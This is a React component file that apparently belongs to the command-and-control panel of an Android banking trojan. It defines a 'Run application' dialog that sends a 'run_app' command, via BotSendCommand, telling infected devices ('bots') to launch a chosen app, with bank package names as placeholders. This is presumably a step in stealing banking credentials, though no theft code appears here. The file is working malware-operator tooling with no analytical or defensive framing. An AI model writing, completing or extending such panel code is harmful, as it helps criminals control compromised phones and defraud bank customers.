import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

// {"this":"~command~","name":"startApp","app":"com.bank.us"}
class RunApplication extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          app: ''
        }
    }

    onChangeApp = (e) => {
        this.setState({ 
            app: e.target.value
        });
    }

    onClickRunAPP = (e) => {
        try_eval('$.notify("Added command [run_app]", "info");');
        SettingsContext.BotSendCommand('{"cmd":"run_app","a":"' + this.state.app + '"}');
        this.setState({ 
            app: ''
        });
    }

    render () {
        return (
            <React.Fragment>
                 <div class="modal fade" id="modalRunApp" tabindex="-1" role="dialog" aria-labelledby="modalRunApp" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Run application</h5>

                            <div class="modal-body">
                                <input class="form-control" value={this.state.app} onChange={this.onChangeApp} placeholder="com.app.android.bank" />       </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickRunAPP} class="btn btn-outline-primary"  data-dismiss="modal">Run application</button>
                            </div>
                        </div>
                    </div>
                </div>
            </React.Fragment>
        );
    }
}

export default RunApplication;